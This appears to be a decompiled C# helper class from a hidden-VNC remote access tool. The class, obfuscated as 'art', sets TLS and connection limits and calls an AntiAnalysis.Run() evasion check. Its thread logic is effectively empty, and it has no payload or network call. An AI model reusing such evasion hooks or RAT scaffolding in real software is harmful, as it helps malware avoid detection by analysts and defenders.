using System;
using System.Net;
using System.Runtime.CompilerServices;
using System.Threading;

namespace BirdBrainmofo.HVNC.Helpers
{
	// Token: 0x020000DD RID: 221
	internal class art
	{
		// Token: 0x060008DA RID: 2266 RVA: 0x0000AC87 File Offset: 0x00008E87
		public art()
		{
			new ThreadStart(delegate
			{
				Thread thread = null;
				Thread thread2 = null;
				ServicePointManager.Expect100Continue = true;
				ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
				ServicePointManager.DefaultConnectionLimit = 9999;
				if (AntiAnalysis.Run() && thread != null && thread.IsAlive)
				{
					thread.Join();
				}
				if (thread != null && thread2 != null && thread2.IsAlive)
				{
					thread2.Join();
				}
			}).Invoke();
		}

		// Token: 0x020000DE RID: 222
		[CompilerGenerated]
		[Serializable]
		private sealed class cccc
		{
			// Token: 0x060008DB RID: 2267 RVA: 0x0000ACB8 File Offset: 0x00008EB8
			// Note: this type is marked as 'beforefieldinit'.
			static cccc()
			{
			}


			// Token: 0x060008DD RID: 2269 RVA: 0x00060768 File Offset: 0x0005E968
			internal void b__0_0()
			{
				Thread thread = null;
				Thread thread2 = null;
				ServicePointManager.Expect100Continue = true;
				ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
				ServicePointManager.DefaultConnectionLimit = 9999;
				if (AntiAnalysis.Run() && thread != null && thread.IsAlive)
				{
					thread.Join();
				}
				if (thread != null && thread2 != null && thread2.IsAlive)
				{
					thread2.Join();
				}
			}

			// Token: 0x0400072E RID: 1838
			public static art.cccc ccc9 = new art.cccc();

			// Token: 0x0400072F RID: 1839
			public static System.Threading.ThreadStart ccc9__0_0;
		}
	}
}
